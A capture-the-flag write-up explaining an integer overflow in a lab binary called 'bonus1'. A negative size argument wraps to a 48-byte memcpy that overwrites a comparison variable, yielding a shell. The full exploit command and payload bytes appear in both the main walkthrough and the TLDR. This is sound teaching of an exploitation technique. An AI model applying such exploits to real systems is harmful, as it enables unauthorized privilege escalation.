# PART 2: Vulnerability Summary

## What is Integer Overflow?

**Integer overflow** occurs when arithmetic operation produces a value outside the range the data type can represent.

### Example with signed int (32-bit):
```
Range: -2,147,483,648 to 2,147,483,647

If we multiply a large negative number:
-1073741812 * 4 = -4,294,967,248

This exceeds the range, so it wraps around!
```

### Signed vs Unsigned conversion:
```
Signed:   -4,294,967,248 (what we calculate)
          ↓
Unsigned: 48 (what memcpy sees!)
```

**Why?** When a signed negative value is cast to unsigned, it wraps around modulo 2^32.

## The Vulnerability Chain

### 1. Weak validation
```c
int num = atoi(argv[1]);
if (num > 9) {
    return 1;  // Exit
}
```

Only checks if positive value ≤ 9, doesn't check for negative numbers!

### 2. Integer overflow in multiplication
```c
int num = atoi(argv[1]);      // num = -1073741812
int size = num * 4;           // size = -4294967248 (signed)
```

The multiplication overflows, creating a huge negative number.

### 3. Unsigned conversion in memcpy
```c
void *memcpy(void *dest, const void *src, size_t n);
                                          ↑
                                    unsigned int!
```

When passed to `memcpy`, the negative value is interpreted as unsigned:
```
-4,294,967,248 → 4,294,967,296 - 4,294,967,248 = 48
```

### 4. Buffer overflow
```c
char buffer[40];                    // Only 40 bytes!
memcpy(buffer, argv[2], 48);        // Copies 48 bytes!
```

We overflow 8 bytes beyond the buffer, overwriting the comparison variable.

## Memory Layout

```
Stack (grows down):
┌─────────────────────┐ esp+0x00
│   Function locals   │
├─────────────────────┤ esp+0x14
│   buffer[40]        │ ← memcpy writes here
│   (40 bytes)        │
├─────────────────────┤ esp+0x3c
│ Comparison variable │ ← We overwrite this!
│   (4 bytes)         │
├─────────────────────┤ esp+0x40
│   Saved EBP         │
├─────────────────────┤ esp+0x44
│   Return Address    │
└─────────────────────┘
```

**Overflow path:**
```
Input: "A"*40 + "\x46\x4c\x4f\x57"
       ↓
[A][A][A]...[A][F][L][O][W]
 ← 40 bytes →  ← 4 bytes →
  Fill buffer   Overwrite
                esp+0x3c
```

## What is 0x574f4c46?

```
Hex:    0x57 0x4f 0x4c 0x46
ASCII:   W    O    L    F    (big-endian)
        
In memory (little-endian):
[0x46][0x4c][0x4f][0x57]
  F     L     O     W    → "FLOW"
```

**Why this value?** It's hardcoded in the program as the condition to execute the shell.

## Why This Works

### Normal execution (num = 5):
```
1. atoi("5") = 5
2. 5 ≤ 9 ✓ (check passes)
3. 5 * 4 = 20 bytes
4. memcpy(buffer, argv[2], 20)
5. Only 20 bytes copied → No overflow
6. esp+0x3c unchanged → Shell not executed
```

### Exploit execution (num = -1073741812):
```
1. atoi("-1073741812") = -1073741812
2. -1073741812 ≤ 9 ✓ (check passes! negative < 9)
3. -1073741812 * 4 = -4294967248
4. Cast to size_t: 48 bytes
5. memcpy(buffer, argv[2], 48)
6. 48 bytes copied → Overflows 8 bytes!
7. esp+0x3c = 0x574f4c46 (our payload)
8. Comparison succeeds → execl("/bin/sh") 
9. Shell as bonus2!
```

## The Payload Structure

```
./bonus1 -1073741812 $(python -c 'print "A"*40 + "\x46\x4c\x4f\x57"')
         └─────┬─────┘                   └──────────┬──────────────┘
          argv[1]                              argv[2]
      (passes check)                    (overflows buffer)
```

| Part | Bytes | Purpose |
|------|-------|---------|
| `"A"*40` | 40 | Fill buffer completely |
| `\x46` | 1 | 'F' - byte 1 of magic value |
| `\x4c` | 1 | 'L' - byte 2 of magic value |
| `\x4f` | 1 | 'O' - byte 3 of magic value |
| `\x57` | 1 | 'W' - byte 4 of magic value |

**Total:** 44 bytes, but memcpy copies 48 (extra 4 are zeros/padding)

## Key Concepts

### 1. Two's Complement
Negative numbers in binary:
```
-1 = 0xFFFFFFFF (all bits set)
-2 = 0xFFFFFFFE
...
-1073741812 = 0xC000000C
```

### 2. Modulo Arithmetic
```
(negative * 4) mod 2^32 = positive result

Example:
-1073741812 * 4 = -4294967248
-4294967248 mod 4294967296 = 48
```

### 3. Type Casting
```c
int signed_value = -4294967248;
size_t unsigned_value = (size_t)signed_value;
// unsigned_value = 48
```

## Why Not Direct EIP Overwrite?

We could calculate a larger overflow to reach EIP (at `esp+0x44`), but:

**Easier path exists:** 
- Program already has `execl("/bin/sh")` code
- Only need to pass the comparison check
- Shorter overflow distance (44 vs 68+ bytes)
- More reliable exploit

**This is a logic bug exploit, not a classic ret2libc/ROP attack.**

## Security Lessons

1. **Always validate negative inputs** when using them in calculations
2. **Check for integer overflow** before multiplication
3. **Use safe string functions** (strncpy, snprintf)
4. **Avoid mixing signed/unsigned arithmetic**
5. **Bounds checking** before memcpy/buffer operations




# TLDR



## Vulnerability
Program uses `atoi()` on first argument, checks if ≤ 9, multiplies by 4, then calls `memcpy()` with that size.

**Weakness:** No check for negative numbers.

## Exploit
Using negative number causes integer overflow:
```
-1073741812 * 4 = -4294967248 (signed)
                ↓ cast to size_t (unsigned)
                = 48 bytes
```

## Memory Layout
```
esp+0x14: buffer[40]      ← memcpy destination
esp+0x3c: comparison var  ← overwrite target
```

Distance: 40 bytes + 4 bytes = 44 bytes needed

## Payload
```bash
./bonus1 -1073741812 $(python -c 'print "A"*40 + "\x46\x4c\x4f\x57"')
```

- `-1073741812`: Passes check (≤9), overflows to 48 bytes when *4
- `"A"*40`: Fill buffer
- `\x46\x4c\x4f\x57`: Magic value `0x574f4c46` (FLOW) in little-endian

## Result
Program compares `esp+0x3c` with `0x574f4c46`:
- If equal → executes `execl("/bin/sh", "sh", 0)`
- Shell as bonus2!

## Key Concepts
- **Integer overflow**: Negative * 4 wraps to positive unsigned value
- **Type casting**: Signed int → unsigned size_t changes interpretation
- **Buffer overflow**: Controlled overflow to overwrite comparison variable
- **Logic bypass**: No EIP overwrite needed, use program's own shell code